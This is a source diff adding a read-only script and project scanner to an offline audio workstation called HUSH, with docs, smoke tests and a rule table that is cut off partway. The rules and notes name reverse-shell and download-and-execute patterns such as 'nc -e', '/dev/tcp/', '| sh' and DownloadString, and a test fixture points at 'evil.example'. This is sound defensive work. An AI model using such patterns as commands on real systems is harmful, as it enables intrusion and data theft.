@@ -1,0 +1,991 @@
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/CHANGELOG.md HUSH-2.2.0-reconciled/CHANGELOG.md
+--- a/CHANGELOG.md	2026-10-14 04:01:51.000000000 +0000
++++ b/CHANGELOG.md	2026-10-15 00:57:26.340328802 +0000
+@@ -1,5 +1,11 @@
+ # Changelog
+ 
++## Unreleased (on top of the HUSH 2.2.0 reconciled tree)
++
++- Added `hush script-scan`: a local, read-only scanner for scripts and project files (Python, Lua, EEL, JSFX, shell, batch, PowerShell, JavaScript, C/C++, REAPER `.RPP` and `reaper-kb.ini`, config files) with URL/secret/obfuscation/persistence rules, plugin inventory, baseline comparison (`--baseline`), `--json`, `--report`, `--allow-host` and `--fail-on`. Never executes, extracts or fetches anything; symlinks are skipped. See SCRIPT_SCAN_NOTES.md.
++- Added `tests/script_scan_tests.cpp` (55 checks) and 13 smoke-test steps; CMake target `script_scan_tests`.
++- Added SCRIPT_SCAN_NOTES.md and HUSH_FEATURE_GAP_CHECK.md (checked against the 2.2.0 source).
++
+ ## HUSH 2.2.0 — 2026-10-14 (early development build)
+ 
+ - Added a visible Record / Stop Rec transport control to the Linux/X11 GUI.
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/CMakeLists.txt HUSH-2.2.0-reconciled/CMakeLists.txt
+--- a/CMakeLists.txt	2026-10-14 03:55:08.000000000 +0000
++++ b/CMakeLists.txt	2026-10-15 00:57:12.201149170 +0000
+@@ -69,7 +69,7 @@
+ 
+ add_library(hush_modules STATIC
+   src/hash.cpp src/time.cpp src/watermark.cpp src/clipboard.cpp src/forensics.cpp src/session.cpp
+-  src/automation.cpp src/recorder.cpp src/markers.cpp src/counter.cpp)
++  src/automation.cpp src/recorder.cpp src/markers.cpp src/counter.cpp src/script_scan.cpp)
+ target_link_libraries(hush_modules PUBLIC hush_audio dawchecker_core)
+ hr_warnings(hush_modules)
+ 
+@@ -120,6 +120,12 @@
+   hr_harden_exe(lanes_tests)
+   add_test(NAME hush_lanes_tests COMMAND lanes_tests)
+ 
++  add_executable(script_scan_tests tests/script_scan_tests.cpp)
++  target_link_libraries(script_scan_tests PRIVATE hush_modules)
++  hr_warnings(script_scan_tests)
++  hr_harden_exe(script_scan_tests)
++  add_test(NAME hush_script_scan_tests COMMAND script_scan_tests)
++
+   add_executable(msv_tests tests/msv_tests.cpp)
+   target_link_libraries(msv_tests PRIVATE dawchecker_core Threads::Threads)
+   if(CMAKE_CXX_COMPILER_ID STREQUAL "GNU")
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/HUSH_FEATURE_GAP_CHECK.md HUSH-2.2.0-reconciled/HUSH_FEATURE_GAP_CHECK.md
+--- a/HUSH_FEATURE_GAP_CHECK.md	1970-01-01 00:00:00.000000000 +0000
++++ b/HUSH_FEATURE_GAP_CHECK.md	2026-10-15 00:57:26.511035305 +0000
+@@ -0,0 +1,42 @@
++# HUSH 2.2.0 feature check: what is missing for a usable DAW
++
++Answer to "does HUSH have a Record button?": **2.1.0 did not; 2.2.0 has a visible Record / Stop Rec control** in the X11 transport (`src/gui_x11.cpp`) and an opt-in PortAudio duplex capture path (`start_recording` / `stop_recording` in `src/portaudio_backend.*`: bounded preallocated buffer, no allocation or disk I/O in the callback, PCM16 WAV written after stop, 5-minute GUI cap, unique take names). What is **not** there: any test of the capture path (no test calls `start_recording`; it needs a device), hardware validation, track arm, punch, pre/post-roll, input monitoring through a channel strip, a device chooser, hot-plug recovery, autosave/crash recovery, loop takes/comping. In my environment PortAudio is not installed, so the capture path was not even compiled in; I confirmed only that the GUI builds and launches under a virtual X server.
++
++Status was checked against the source and HUSH's own documents (grep of `src/`, `src/gui_x11.cpp`, README, PORTING_STATUS) and the SoundCraft README feature list you pasted as the reference set. "Done" means present and tested in HUSH 2.1.0. Priorities use your Early Release format (P0 blockers, P1 essential for a first usable release, P2 important, P3 future).
++
++| Priority | Feature | HUSH 2.1.0 | Notes |
++|---|---|---|---|
++| P0 | Audio output AND capture proven on real hardware | Not verified | PortAudio backend never exercised with a device; opt-in build |
++| P0 | Session save/crash safety | Partial | atomic saves done; no autosave or crash recovery |
++| P1 | Recording: arm, punch, pre/post-roll, input monitoring, take management | Partial (2.2.0) | Record/Stop Rec button + duplex capture + WAV take exist; no hardware validation, no unit test of capture, no arm/punch/monitoring |
++| P1 | Audio device and buffer-size chooser, hot-plug recovery | Missing | default output device only |
++| P1 | Clip editing in the GUI (select, drag, split, trim, fades) | Missing in GUI | move/trim/split/fade exist as library and CLI commands only |
++| P1 | Undo for all edits in the GUI | Partial | gain/mute only |
++| P1 | Timeline zoom and scroll | Missing | |
++| P1 | Loop and punch ranges | Missing | |
++| P1 | Export / bounce from the GUI | Missing | `session-render` works from the CLI (WAV only) |
++| P1 | Solo, pan | Missing | pan lanes stored but no panner; no solo |
++| P1 | MIDI hardware I/O and MIDI editor | Missing | event queue only |
++| P1 | Plugin hosting (VST3 / CLAP / AU) | Missing | in-process DSP interface only; policy and sandboxing undecided |
++| P1 | Markers, memory locations, big counter in the GUI | Library/CLI only | `marker-*`, `counter` exist; no panels |
++| P1 | Automation in the GUI, live Write/Touch/Latch from faders | Library/CLI only | state machine tested; nothing feeds it live; only volume and mute lanes render |
++| P1 | Metronome / click, tempo-map editor | Missing | tempo map is a library, constant BPM in CLI |
++| P2 | Sends, aux busses, master bus, VCAs, groups | Missing | send lanes stored, nothing to send to |
++| P2 | Audio formats beyond WAV (FLAC, AIFF, MP3, Ogg) | Missing | WAV in; PCM16 WAV out |
++| P2 | Bounce options: bit depth, dither, normalize, LUFS / true-peak report | Missing | no dither, no loudness |
++| P2 | Windows and macOS GUI and builds | Missing | Linux/X11 only |
++| P2 | Accessibility pass, keyboard-only use, translations | Missing | |
++| P2 | Real-world calibration and independent security review | Open | synthetic corpus only |
++| P3 | Playlists and comping, elastic audio / time-stretch, Beat Detective | Missing | |
++| P3 | Surround / immersive, video track, score editor, AudioSuite offline plugins | Missing | |
++| P3 | Built-in synths and effects (EQ, compressor, reverb ...) | Missing | one test-only gain plugin |
++| Done | Offline-first design, no network / telemetry, safe file output | Done | tested |
++| Done | WAV in/out, offline render with gain, mute, trim, fades, volume/mute automation | Done | |
++| Done | Real-time mixer core, transport, peak meter | Done | callback allocation-free by design; tested |
++| Done | Session model, v1/v2 files, undo/redo API | Done | |
++| Done | Automation lanes, markers, big-counter formatter | Done (data/CLI) | translated from SoundCraft's model |
++| Done | Forensics, watermark, MSV engine (hardened fork) | Done | indicators, synthetic calibration |
++| Done | Local script/project scanner (`script-scan`) | Done | this change |
++Not in the SoundCraft README list but worth deciding: the SoundCraft MCP / control-channel and its `soundcraft-automation` crate. HUSH's spec excludes remote control, so they are deliberately not wanted.
++
++Suggested order for the next release: (1) device chooser + hardware playback and capture test, (2) arm/punch/pre-roll + input monitoring and a unit test for the capture buffer logic, (3) GUI clip editing + zoom/scroll + loop, (4) solo/pan/bounce from the GUI, (5) autosave/recovery, then MIDI I/O and the plugin-hosting decision.
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/PORTING_STATUS.md HUSH-2.2.0-reconciled/PORTING_STATUS.md
+--- a/PORTING_STATUS.md	2026-10-14 03:55:57.000000000 +0000
++++ b/PORTING_STATUS.md	2026-10-15 00:57:12.201440330 +0000
+@@ -20,6 +20,7 @@
+ | DawChecker-derived forensics | Implemented/tested | Local indicators and synthetic calibration; real-world calibration and independent audit remain open |
+ | Watermark | Experimental | Explicit embed/detect and tests; audibility and robustness against codecs/resampling/attacks not established |
+ | OS clipboard integration | Not implemented | Consent-gated library logic only; no platform clipboard backend |
++| Script / project scanner (`script-scan`) | Implemented/tested | Local, read-only pattern scanner with baseline comparison; 55 unit checks + 13 CLI steps; indicators only |
+ | Optional admin utilities | Excluded | Not built, installed, linked, or activated by HUSH |
+ | Release security certification | Not claimed | No independent audit, full fuzzing, or verified network-isolated release run |
+ 
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/README.md HUSH-2.2.0-reconciled/README.md
+--- a/README.md	2026-10-14 03:55:57.000000000 +0000
++++ b/README.md	2026-10-15 00:57:12.201510408 +0000
+@@ -9,6 +9,7 @@
+ | Audio files | WAV import: PCM 8/16/24/32-bit and IEEE float32; atomic PCM16 WAV export; tone, gain, mix and stats | No FLAC/AIFF/MP3; large WAVs require memory proportional to file size |
+ | Session editing | Track/clip model; v1 and v2 session reader; v2 stores source trim, clip length, fades; tested move/trim/split/fade APIs; bounded snapshot undo/redo | Clip-edit operations are library APIs, not all exposed as GUI tools; GUI edits gain/mute only |
+ | Offline render | Track gain/mute, volume/mute automation, clip trim and fades | Pan/send/plugin automation is stored but not rendered |
++| Script / project scanner | `hush script-scan` reads Python, Lua, EEL, JSFX, shell, batch, PowerShell, JS, C/C++, REAPER `.RPP` / `reaper-kb.ini` and config files as text, offline; pattern indicators only (see SCRIPT_SCAN_NOTES.md) | Binaries and archives are hashed, not analyzed; false positives and negatives expected |
+ | Real-time mixer | Preloaded audio; bounded callback loop; no callback allocations; transport, seek, track gain/mute, master gain and peak meter | Playback only; no recording/monitoring or device hot-plug recovery yet |
+ | Linux device output | Optional system PortAudio backend; default output device; no dependency downloads | Physical hardware output was not exercised in this environment; GUI currently uses default output, not a device chooser |
+ | GUI | Native X11 window: transport, timeline, clip waveform overview, track rows, mixer gain, mute, peak meter, Ctrl+S, Ctrl+Z, Ctrl+Y | Linux/X11 only in this release; no clip drag/split UI, zoom/scroll, plugin panels, accessibility pass or multi-platform GUI |
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/SCRIPT_SCAN_NOTES.md HUSH-2.2.0-reconciled/SCRIPT_SCAN_NOTES.md
+--- a/SCRIPT_SCAN_NOTES.md	1970-01-01 00:00:00.000000000 +0000
++++ b/SCRIPT_SCAN_NOTES.md	2026-10-15 00:57:26.515593648 +0000
+@@ -0,0 +1,36 @@
++# `hush script-scan`: local script and project scanner (added after 2.1.0)
++
++Read-only, offline, no model needed. It reads files as text and applies fixed rules. It never executes, imports, extracts or fetches anything, never contacts a URL it finds, and skips symbolic links. It writes a file only when you pass `--report` (atomic, refuses to overwrite without `--overwrite`).
++
++## Usage
++```
++hush script-scan PATH [--json] [--report OUT [--overwrite]] [--baseline SHA256SUMS] [--allow-host HOST]... [--fail-on low|medium|high|critical]
++```
++`PATH` is a file or a folder (up to 5,000 files, 8 levels deep, 5 MiB per file; larger files are hashed, not scanned). `--fail-on` makes the exit code 3 when a finding at or above that level exists, for use in CI. `--baseline` takes a `sha256sum`-style file and reports modified, new and missing files. `--allow-host` silences URLs to that host and its subdomains.
++
++## What it reads
++| Kind | Detected by | Checked for |
++|---|---|---|
++| Python | `.py .pyw .pyi`, shebang | subprocess / os.system / popen / exec, eval, `__import__`, pickle/marshal, ctypes, socket / urllib / http / requests / ftplib / smtplib / telnetlib / websocket / paramiko, delete and write-mode `open()`, decode-then-execute |
++| Lua, EEL | `.lua .eel` | os.execute, io.popen, load / loadstring / dofile / loadfile, package.loadlib / cpath, luasocket, delete / rename / write-mode `io.open` |
++| REAPER scripts (Lua/EEL/Python) | same | `ExecProcess` (incl. Python `RPR_ExecProcess`), SWS `CF_ShellExecute`, `AddRemoveReaScript`, persistent `SetExtState(..., true)`, `js_ReaScriptAPI` memory calls, `reaper.defer` loops, `__startup.*` file names |
++| JSFX | `.jsfx`, `desc:` header | file access |
++| REAPER project / actions | `.RPP`, `reaper-kb.ini` | plugin inventory (`<VST`, `<CLAP`, `<JS`, `<AU`), media paths outside the project, plugin-state blobs counted (not analyzed), registered scripts and custom actions |
++| Shell, batch, PowerShell | `.sh .bash .bat .cmd .ps1`, Makefile, Dockerfile | curl / wget, pipe into sh, `/dev/tcp`, `nc -e`, rm -rf, Invoke-Expression / iex, `-EncodedCommand`, DownloadString / DownloadFile, certutil, bitsadmin, reg add, schtasks |
++| JavaScript, C/C++ | `.js .mjs .ts`, `.c .cpp .h ...` | child_process, eval, fetch / XHR / WebSocket; system, popen, exec*, dlopen, LoadLibrary, socket |
++| Any text or config | everything else | URLs (cleartext, IP literals, `.onion`), secrets by kind (values redacted), long base64 / hex blobs, `\x` escape floods, very long lines, persistence keywords (cron, systemd, launchd, Run key, authorized_keys) |
++| Binaries, archives | magic bytes | hashed and listed only; native plugin files (`.vst3 .clap .dll .so .dylib ...`) are inventoried as "not analyzed"; archives are not opened |
++UTF-16 files with a byte-order mark are read as their ASCII subset.
++
++## Limits (read these)
++- Pattern matching: expect false positives (a legitimate `os.system` call) and false negatives. Heavy obfuscation, string building and indirection defeat it.
++- Comments and Python docstrings are skipped for code rules by a simple parser, not a full language parser.
++- No data-flow analysis. It cannot tell whether a command line is constant or attacker-controlled.
++- Compiled code and archives are never analyzed. Use the hashes and your plugin allowlist.
++- REAPER API names come from my knowledge of ReaScript; check them against your REAPER version.
++- Output severities and confidence numbers are rule defaults, not measured probabilities.
++
++Self-scan note: scanning HUSH's own tree reports High findings in `src/script_scan.cpp`, `tests/script_scan_tests.cpp` and `SCRIPT_SCAN_NOTES.md` (they contain the patterns as data), in the smoke test's `rm -rf` cleanup, and in the `optional/` installers (genuine). All were reviewed; none is unexpected. Treat scans of security documents and rule tables the same way.
++
++## Evidence
++`tests/script_scan_tests.cpp` (55 checks), 13 CLI steps in `scripts/smoke_test.sh`; outputs in `evidence/script_scan/`.
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/scripts/smoke_test.sh HUSH-2.2.0-reconciled/scripts/smoke_test.sh
+--- a/scripts/smoke_test.sh	2026-10-13 04:53:04.000000000 +0000
++++ b/scripts/smoke_test.sh	2026-10-15 00:57:12.201676214 +0000
+@@ -67,4 +67,23 @@
+ "$FK" session-info $S | grep -q "tracks=1"; ok $? "session with lanes and markers reloads"
+ "$FK" counter 2932800 --sr 48000 --bpm 120 --fps 30 | grep -q "00:01:01:03 .* 31|3|192 .* 0:01:01.100"; ok $? "big counter shows timecode, bars|beats, min:sec and samples"
+ expect_fail "$FK" counter 100 --fps 12; ok $? "counter rejects an unsupported frame rate"
++SC=$T/scan; mkdir -p $SC/sub
++printf 'import subprocess\nsubprocess.run(["ls"])\nu = "https://evil.example/x"\n' > $SC/a.py
++printf 'os.execute("ls")\nreaper.SetExtState("a","b","c",true)\n' > $SC/sub/s.lua
++printf 'echo hi\n' > $SC/ok.sh
++"$FK" script-scan $SC | grep -q "py-subprocess"; ok $? "script-scan finds a Python subprocess call"
++"$FK" script-scan $SC | grep -q "lua-os-execute"; ok $? "script-scan finds Lua os.execute"
++"$FK" script-scan $SC | grep -q "reaper-extstate-persist"; ok $? "script-scan finds a persistent REAPER ExtState write"
++"$FK" script-scan $SC --json | grep -q '"requires_human_review": true'; ok $? "script-scan --json output"
++"$FK" script-scan $SC --report $T/scan.txt | grep -q "report written"; ok $? "script-scan --report writes a file on request"
++expect_fail "$FK" script-scan $SC --report $T/scan.txt; ok $? "script-scan --report refuses to overwrite"
++expect_fail "$FK" script-scan $SC --fail-on high; ok $? "script-scan --fail-on high exits non-zero when there are High findings"
++"$FK" script-scan $SC/ok.sh --fail-on high >/dev/null; ok $? "script-scan --fail-on passes a clean file"
++"$FK" script-scan $SC --allow-host evil.example | grep -q "url-host"; [ $? -ne 0 ]; ok $? "script-scan --allow-host suppresses that host"
++(cd $SC && find . -type f | sort | xargs sha256sum) > $T/base.txt
++"$FK" script-scan $SC --baseline $T/base.txt --json | grep -q '"modified_files": \[\]'; ok $? "baseline: unchanged tree matches"
++printf 'tampered\n' > $SC/ok.sh
++"$FK" script-scan $SC --baseline $T/base.txt --json | grep -q '"modified_files": \["ok.sh"\]'; ok $? "baseline: a modified file is reported"
++ln -s $SC $T/scanlink; expect_fail "$FK" script-scan $T/scanlink; ok $? "script-scan refuses a symlink root"
++expect_fail "$FK" script-scan $T/does-not-exist; ok $? "script-scan reports a missing path"
+ echo "smoke: $pass passed, $fail failed"; [ $fail -eq 0 ]
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/src/main.cpp HUSH-2.2.0-reconciled/src/main.cpp
+--- a/src/main.cpp	2026-10-14 03:56:06.000000000 +0000
++++ b/src/main.cpp	2026-10-15 00:57:12.201807852 +0000
+@@ -24,6 +24,7 @@
+ #include "core/SecurityHardening.h"
+ #include "forensics.hpp"
+ #include "hash.hpp"
++#include "script_scan.hpp"
+ #include "session.hpp"
+ #include "time.hpp"
+ #include "watermark.hpp"
+@@ -66,6 +67,8 @@
+   hush counter SAMPLE [--sr N] [--bpm B] [--fps 24|25|30|29.97df]   (big counter read-out)
+ Time:
+   hush bbt BPM NUM DEN QUARTER_BEATS | timecode FRAME 24|25|30|29.97df
++Script / project scanning (local, read-only, never executes or fetches):
++  hush script-scan PATH [--json] [--report OUT [--overwrite]] [--baseline SHA256SUMS] [--allow-host HOST]... [--fail-on low|medium|high|critical]
+ Text safety:
+   hush sensitive-check FILE                (kinds only; never prints the matches)
+ )";
+@@ -411,6 +414,27 @@
+           : throw std::runtime_error("fps must be 24, 25, 30 or 29.97df");
+     auto t = fk::time::frames_to_timecode(static_cast<std::int64_t>(unum(a[0], "frame")), f);
+     std::cout << need(t) << "\n";
++  } else if (cmd == "script-scan") {
++    // Local, read-only static scan of scripts / project files. Never executes, extracts or fetches anything.
++    fk::scan::Options so; std::string v, rep_out, fail_on;
++    bool as_json = has_flag(a, "--json"), overwrite = has_flag(a, "--overwrite");
++    while (take_opt(a, "--allow-host", v)) so.allow_hosts.push_back(v);
++    take_opt(a, "--baseline", so.baseline_path);
++    bool have_rep = take_opt(a, "--report", rep_out), have_fail = take_opt(a, "--fail-on", fail_on);
++    if (a.size() != 1) throw std::runtime_error("script-scan requires PATH [--json] [--report OUT [--overwrite]] [--baseline SHA256SUMS] [--allow-host HOST]... [--fail-on low|medium|high|critical]");
++    fk::scan::Severity threshold = fk::scan::Severity::Critical;
++    if (have_fail) {
++      if (fail_on == "low") threshold = fk::scan::Severity::Low; else if (fail_on == "medium") threshold = fk::scan::Severity::Medium;
++      else if (fail_on == "high") threshold = fk::scan::Severity::High; else if (fail_on == "critical") threshold = fk::scan::Severity::Critical;
++      else throw std::runtime_error("--fail-on must be low, medium, high or critical");
++    }
++    if (have_rep) require_new_output({}, rep_out, overwrite);
++    auto r = fk::scan::scan_path(a[0], so);
++    auto& report = need(r);
++    const std::string text = as_json ? report.to_json() : report.to_text();
++    if (have_rep) { write_text_output(rep_out, text, overwrite); std::cout << "report written to " << rep_out << "\n"; }
++    else std::cout << text;
++    if (have_fail && report.worst() >= threshold && !report.findings.empty()) { std::cerr << "script-scan: findings at or above '" << fail_on << "' were found\n"; return 3; }
+   } else if (cmd == "sensitive-check") {
+     if (a.size() != 1) throw std::runtime_error("sensitive-check requires FILE");
+     std::ifstream f(a[0], std::ios::binary);
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/src/script_scan.cpp HUSH-2.2.0-reconciled/src/script_scan.cpp
+--- a/src/script_scan.cpp	1970-01-01 00:00:00.000000000 +0000
++++ b/src/script_scan.cpp	2026-10-15 00:57:12.201920102 +0000
+@@ -0,0 +1,578 @@
++#include "script_scan.hpp"
++#include <algorithm>
++#include <cctype>
++#include <cstring>
++#include <cstdio>
++#include <fstream>
++#include <map>
++#include <set>
++#include <sstream>
++#include "clipboard.hpp"
++#include "hash.hpp"
++namespace fk::scan {
++namespace fs = std::filesystem;
++const char* severity_name(Severity s) {
++  switch (s) { case Severity::Info: return "info"; case Severity::Low: return "low"; case Severity::Medium: return "medium";
++               case Severity::High: return "high"; case Severity::Critical: return "critical"; }
++  return "info";
++}
++namespace {
++enum Lang : unsigned { PY = 1, LUA = 2, EEL = 4, JSFX = 8, SH = 16, BAT = 32, PS = 64, JS = 128, CC = 256, RPP = 512, CFG = 1024, OTHER = 2048, KB = 4096 };
++constexpr unsigned ALL = 0xFFFF, CODE = PY | LUA | EEL | JSFX | SH | BAT | PS | JS | CC;
++constexpr unsigned LUALIKE = LUA | EEL | PY;      // REAPER scripting languages
++constexpr unsigned SHELLISH = SH | BAT | PS;
++enum Flag : unsigned { NONE = 0, NOT_AFTER_DOT = 1, NO_BOUNDARY = 2 };   // NO_BOUNDARY: also match inside RPR_ExecProcess-style names
++struct Rule {
++  const char* id; unsigned langs; const char* needle; unsigned flags; Severity sev; const char* topic; const char* category;
++  const char* title; const char* why; double conf, fp;
++};
++using S = Severity;
++const Rule kRules[] = {
++  // ---- process execution ----
++  {"py-subprocess", PY, "subprocess.", NONE, S::Medium, "process_exec", "backdoor", "subprocess use", "runs external programs; check the command line and who controls it", .6, .4},
++  {"py-os-system", PY, "os.system(", NONE, S::High, "process_exec", "backdoor", "os.system call", "runs a shell command", .8, .25},
++  {"py-os-popen", PY, "os.popen(", NONE, S::High, "process_exec", "backdoor", "os.popen call", "runs a shell command and reads its output", .8, .25},
++  {"py-os-exec", PY, "os.exec", NONE, S::High, "process_exec", "backdoor", "os.exec* call", "replaces the process with another program", .8, .25},
++  {"py-os-spawn", PY, "os.spawn", NONE, S::Medium, "process_exec", "backdoor", "os.spawn* call", "starts another process", .7, .3},
++  {"py-pty-spawn", PY, "pty.spawn", NONE, S::High, "process_exec", "backdoor", "pty.spawn call", "typical of reverse-shell code", .8, .2},
++  {"lua-os-execute", LUA, "os.execute", NONE, S::High, "process_exec", "backdoor", "os.execute call", "runs a shell command", .8, .25},
++  {"lua-io-popen", LUA, "io.popen", NONE, S::High, "process_exec", "backdoor", "io.popen call", "runs a shell command and reads its output", .8, .25},
++  {"reaper-execprocess", LUALIKE, "execprocess(", NO_BOUNDARY, S::High, "process_exec", "reascript_risk", "ReaScript ExecProcess", "runs a command line from inside REAPER; judge the command and whether the user triggered it", .7, .35},
++  {"reaper-shellexecute", LUALIKE, "cf_shellexecute", NO_BOUNDARY, S::Medium, "process_exec", "reascript_risk", "SWS CF_ShellExecute", "opens a file or URL with the system handler", .6, .4},
++  {"sh-curl", SH, "curl ", NONE, S::Medium, "network", "call_home", "curl invocation", "downloads or uploads over the network", .6, .4},
++  {"sh-wget", SH, "wget ", NONE, S::Medium, "network", "call_home", "wget invocation", "downloads over the network", .6, .4},
++  {"sh-nc-e", SH, "nc -e", NONE, S::High, "process_exec", "backdoor", "netcat with -e", "classic bind/reverse shell", .9, .1},
++  {"sh-dev-tcp", SH, "/dev/tcp/", NONE, S::High, "network", "backdoor", "bash /dev/tcp redirection", "opens a raw TCP connection from the shell; common in reverse shells", .85, .15},
++  {"sh-bash-i", SH, "bash -i", NONE, S::High, "process_exec", "backdoor", "interactive bash", "typical of reverse-shell one-liners", .6, .4},
++  {"sh-pipe-shell", SH, "| sh", NONE, S::High, "process_exec", "backdoor", "pipe into a shell", "executes whatever the previous command produced", .7, .3},
++  {"sh-pipe-bash", SH, "| bash", NONE, S::High, "process_exec", "backdoor", "pipe into bash", "executes whatever the previous command produced", .7, .3},
++  {"sh-base64-d", SH, "base64 -d", NONE, S::Medium, "obfuscation", "backdoor", "base64 decode in shell", "decoded content is often executed next", .5, .5},
++  {"sh-eval", SH, "eval ", NONE, S::Medium, "dynamic_code", "backdoor", "eval in shell", "executes a constructed string", .5, .5},
++  {"sh-mkfifo", SH, "mkfifo", NONE, S::Medium, "process_exec", "backdoor", "named pipe creation", "used in some reverse-shell constructions", .4, .6},
++  {"ps-iwr", SHELLISH, "invoke-webrequest", NONE, S::Medium, "network", "call_home", "Invoke-WebRequest", "downloads or uploads over the network", .6, .4},
++  {"ps-iex", SHELLISH, "invoke-expression", NONE, S::High, "dynamic_code", "backdoor", "Invoke-Expression", "executes a constructed string", .8, .2},
++  {"ps-iex-short", PS | BAT, "iex ", NOT_AFTER_DOT, S::High, "dynamic_code", "backdoor", "iex alias", "executes a constructed string", .6, .4},
++  {"ps-enc", SHELLISH, "-encodedcommand", NONE, S::High, "obfuscation", "backdoor", "PowerShell -EncodedCommand", "hides the command in base64", .85, .15},
++  {"ps-downloadstring", SHELLISH, "downloadstring", NONE, S::High, "network", "call_home", "DownloadString", "downloads code as text, usually to execute it", .85, .15},
++  {"ps-downloadfile", SHELLISH, "downloadfile", NONE, S::High, "network", "call_home", "DownloadFile", "downloads a file", .8, .2},
++  {"ps-frombase64", SHELLISH, "frombase64string", NONE, S::Medium, "obfuscation", "backdoor", "FromBase64String", "decodes hidden content", .5, .5},
++  {"win-certutil", SHELLISH, "certutil", NONE, S::Medium, "network", "call_home", "certutil", "often abused to download or decode files", .5, .5},
++  {"win-bitsadmin", SHELLISH, "bitsadmin", NONE, S::Medium, "network", "call_home", "bitsadmin", "often abused to download files", .6, .4},
++  {"win-reg-add", SHELLISH, "reg add", NONE, S::Medium, "persistence", "backdoor", "registry write", "can create startup entries", .5, .5},
++  {"win-schtasks", SHELLISH, "schtasks", NONE, S::Medium, "persistence", "backdoor", "scheduled task", "can create persistence", .6, .4},
++  {"js-child-process", JS, "child_process", NONE, S::High, "process_exec", "backdoor", "child_process", "runs external programs", .8, .25},
++  {"js-eval", JS, "eval(", NOT_AFTER_DOT, S::Medium, "dynamic_code", "backdoor", "eval call", "executes a constructed string", .6, .4},
++  {"js-new-function", JS, "new function(", NONE, S::Medium, "dynamic_code", "backdoor", "new Function", "executes a constructed string", .6, .4},
++  {"c-system", CC, "system(", NOT_AFTER_DOT, S::High, "process_exec", "backdoor", "system() call", "runs a shell command", .8, .25},
++  {"c-popen", CC, "popen(", NOT_AFTER_DOT, S::High, "process_exec", "backdoor", "popen() call", "runs a shell command", .8, .25},
++  {"c-exec", CC, "execv", NONE, S::High, "process_exec", "backdoor", "exec* call", "replaces the process", .8, .25},
++  {"c-dlopen", CC, "dlopen(", NONE, S::Medium, "dynamic_code", "backdoor", "dlopen", "loads native code at run time", .6, .4},
++  {"c-loadlibrary", CC, "loadlibrary", NONE, S::Medium, "dynamic_code", "backdoor", "LoadLibrary", "loads native code at run time", .6, .4},
++  {"c-socket", CC, "socket(", NOT_AFTER_DOT, S::Medium, "network", "call_home", "socket()", "opens a network socket", .6, .4},
++  // ---- dynamic code ----
++  {"py-exec", PY, "exec(", NOT_AFTER_DOT, S::High, "dynamic_code", "backdoor", "exec call", "executes a constructed string", .7, .3},
++  {"py-eval", PY, "eval(", NOT_AFTER_DOT, S::High, "dynamic_code", "backdoor", "eval call", "executes a constructed expression", .7, .3},
++  {"py-import-dyn", PY, "__import__(", NONE, S::Medium, "dynamic_code", "backdoor", "__import__", "imports a module chosen at run time", .6, .4},
++  {"py-pickle", PY, "pickle.loads", NONE, S::High, "dynamic_code", "backdoor", "pickle.loads", "unpickling untrusted data can run code", .7, .3},
++  {"py-marshal", PY, "marshal.loads", NONE, S::High, "dynamic_code", "backdoor", "marshal.loads", "loads code objects", .7, .3},
++  {"py-ctypes", PY, "ctypes.", NONE, S::Medium, "dynamic_code", "backdoor", "ctypes", "calls native code directly", .6, .4},
++  {"lua-loadstring", LUA, "loadstring(", NOT_AFTER_DOT, S::High, "dynamic_code", "backdoor", "loadstring", "executes a constructed string", .8, .2},
++  {"lua-load", LUA, "load(", NOT_AFTER_DOT, S::Medium, "dynamic_code", "backdoor", "load", "may execute a constructed string", .5, .5},
++  {"lua-dofile", LUA, "dofile(", NOT_AFTER_DOT, S::Medium, "dynamic_code", "backdoor", "dofile", "runs another file", .6, .4},
++  {"lua-loadfile", LUA, "loadfile(", NOT_AFTER_DOT, S::Medium, "dynamic_code", "backdoor", "loadfile", "loads another file as code", .6, .4},
++  {"lua-loadlib", LUA, "package.loadlib", NONE, S::High, "dynamic_code", "backdoor", "package.loadlib", "loads a native library", .8, .2},
++  {"lua-cpath", LUA, "package.cpath", NONE, S::Medium, "dynamic_code", "backdoor", "package.cpath", "changes where native modules are loaded from", .6, .4},
++  // ---- network ----
++  {"py-socket", PY, "import socket", NONE, S::Medium, "network", "call_home", "socket module", "can open network connections or listeners", .6, .4},
++  {"py-socket-from", PY, "from socket", NONE, S::Medium, "network", "call_home", "socket module", "can open network connections or listeners", .6, .4},
++  {"py-socketserver", PY, "socketserver", NONE, S::High, "network", "backdoor", "socketserver", "runs a network listener", .7, .3},
++  {"py-urllib", PY, "urllib", NONE, S::Medium, "network", "call_home", "urllib", "makes HTTP requests", .6, .4},
++  {"py-http-client", PY, "http.client", NONE, S::Medium, "network", "call_home", "http.client", "makes HTTP requests", .6, .4},
++  {"py-requests", PY, "import requests", NONE, S::Medium, "network", "call_home", "requests", "makes HTTP requests", .6, .4},
++  {"py-httpx", PY, "import httpx", NONE, S::Medium, "network", "call_home", "httpx", "makes HTTP requests", .6, .4},
++  {"py-aiohttp", PY, "aiohttp", NONE, S::Medium, "network", "call_home", "aiohttp", "makes HTTP requests", .6, .4},
++  {"py-ftplib", PY, "ftplib", NONE, S::Medium, "network", "call_home", "ftplib", "FTP transfers", .6, .4},
++  {"py-smtplib", PY, "smtplib", NONE, S::Medium, "network", "exfiltration", "smtplib", "sends e-mail", .6, .4},
